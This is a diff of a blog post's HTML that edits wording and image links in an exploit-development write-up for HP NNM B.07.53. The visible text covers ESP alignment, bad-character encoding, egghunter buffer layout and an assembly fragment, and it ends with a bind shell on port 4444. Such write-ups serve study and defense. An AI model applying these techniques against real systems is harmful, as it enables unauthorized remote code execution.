@@ -5981,9 +5961,9 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 
 <h2><code>ESP</code> Align By <code>4</code></h2>
 
-<p>As we know that <code>ASLR</code> is turned on, so we need to make sure and align the stack pointer / <code>ESP</code> always by 4 in order to run the shellcode <code>reliably</code>.</p>
+<p>As we know that <code>ASLR</code> is turned on, so we need to make sure and align the stack pointer / <code>ESP</code> always by 4 to run the shellcode <code>reliably</code>.</p>
 
-<p>This means, for a <code>32</code> bit system, the address stored in the <code>ESP</code> should be always divisible by <code>4</code>.</p>
+<p>It means, for a <code>32</code> bit system, the address stored in the <code>ESP</code> should always be divisible by <code>4</code>.</p>
 
 <p>We can use the following logic to achieve this.</p>
 
@@ -6010,9 +5990,9 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>However, the hex bytes contains some bad characters.</p>
+<p>However, the hex bytes contain some bad characters.</p>
 
-<p>To overcome this <code>prepend</code> this logic / hex bytes just before the actual shellcode and use <code>alpha_num_encoder.py</code> to encode the entire string.</p>
+<p>To overcome this, <code>prepend</code> this logic/hex bytes just before the actual shellcode and use <code>alpha_num_encoder.py</code> to encode the entire string.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6021,7 +6001,7 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>In this way, we can make sure that the code will be placed / run before the actual shellcode.</p>
+<p>In this way, we can make sure that the code can be placed/run before the actual shellcode.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6030,13 +6010,13 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Detailed output of the script =>  <a href="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/result.txt">result.txt</a></p>
+<p>Detailed output of the script =>  <a href="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/result.txt">result.txt</a></p>
 
 <h2>Buffer Layout</h2>
 
-<p>From the egghunter code, we can figure out that when the the egghunter finds the egg marker, it loads up <code>JUMP</code> address into <code>EDI</code> register.</p>
+<p>From the egghunter code, we can figure out that when the egghunter finds the egg marker, it loads up <code>JUMP</code> address into the <code>EDI</code> register.</p>
 
-<p>So we can easily get hold the <code>EIP</code> by directly moving that <code>EDI</code> value to <code>EAX</code> .</p>
+<p>So we can quickly get hold of the <code>EIP</code> by directly moving that <code>EDI</code> value to <code>EAX</code>.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6045,7 +6025,7 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Now lets find what <code>value</code> we can add with <code>AX</code> register.</p>
+<p>Now let&rsquo;s find what <code>value</code> we can add with <code>AX</code> register.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6081,7 +6061,7 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span><span class='line'><span class="c"># after \x09, \x0b is good char =&gt; so we can use the value 0x0b as the stating char.</span>
 </span><span class='line'><span class="c"># for the last char, we can choose any value from the good char set. lets choose =&gt; 0x01</span>
 </span><span class='line'>
-</span><span class='line'><span class="c"># final logic will be</span>
+</span><span class='line'><span class="c"># final logic</span>
 </span><span class='line'>PUSH EDI
 </span><span class='line'>POP EAX
 </span><span class='line'>ADD AX, 0xb01 <span class="c"># adding 2817</span>
@@ -6090,7 +6070,7 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Use <code>mona.py</code> to generate the opcode</p>
+<p>Use <code>mona.py</code> to generate the opcode.</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6099,13 +6079,13 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Online tool => <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p>
+<p>On-line tool => <a href="https://defuse.ca/online-x86-assembler.htm#disassembly">https://defuse.ca/online-x86-assembler.htm#disassembly</a></p>
 
-<p>Prepare the final buffer that will lay out in the <code>memory</code> like below</p>
+<p>Prepare the final buffer that will layout in the <code>memory</code> like below.</p>
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/stack_layout.png" alt="stack_layout.png" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/stack_layout.png" alt="stack_layout.png" /></p>
 
-<p>We have to use the initial <code>3305</code> bytes buffer to fit the followings</p>
+<p>We have to use the initial <code>3305</code> bytes buffer to fit the following.</p>
 
 <ul>
 <li>egg marker - <code>T00WT00W</code></li>
@@ -6117,7 +6097,7 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 
 <h2>The Shell</h2>
 
-<p>Fired up the final exploit code and it will open a tcp port <code>4444</code>.</p>
+<p>Fired up the final exploit code, and it opens a TCP port <code>4444</code>.</p>
 
 <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -6496,16 +6476,15 @@ Remember that the <code>value</code> should not be larger than  <code>464</code>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p><img src="http://greyshell.github.io/downloads/code/2016/hpnnm-B.07.53/shell_bind_tcp.png" alt="shell_bind_tcp" /></p>
+<p><img src="http://greyshell.github.io/artifacts/hpnmm_B.07.53_exploit.assets/shell_bind_tcp.png" alt="shell_bind_tcp" /></p>
 
-<blockquote><p>Make sure the firewall is <code>ON</code> and <code>ovas.exe</code> is added into the program exceptions.
-Otherwise while during the shellcode execution, an exception will occur and the payload will not work as expected.</p></blockquote>
+<blockquote><p>If windows <code>firewall</code> is enabled, add the <code>ovas.exe</code> into the program&rsquo;s exceptions`.
+Otherwise, during the script execution, the payload does not get executed due to an exception.</p></blockquote>
 
 <h2>Conclusion</h2>
 
-<p>At the end of my journey, I found my final exploit code was turned out entirely different from <strong><em>muts</em></strong> <a href="https://www.exploit-db.com/exploits/5342/">EDB-ID #5342</a>.</p>
-
-<p>The reason was, in this particular <code>B.07.53</code> release, application validates the length of <code>GET</code> request and that restricted me to deliver the payload the same way as <strong>muts</strong> did.</p>
+<p>At the end of my journey, I found my final exploit code was turned out entirely different from <strong><em>muts</em></strong> <a href="https://www.exploit-db.com/exploits/5342/">EDB-ID #5342</a>.
+The reason was, <code>B.07.53</code> release validates the length of <code>GET</code> request, which restricted me from delivering the payload the way <strong>muts</strong> did.</p>
 
 <h2>References</h2>
 
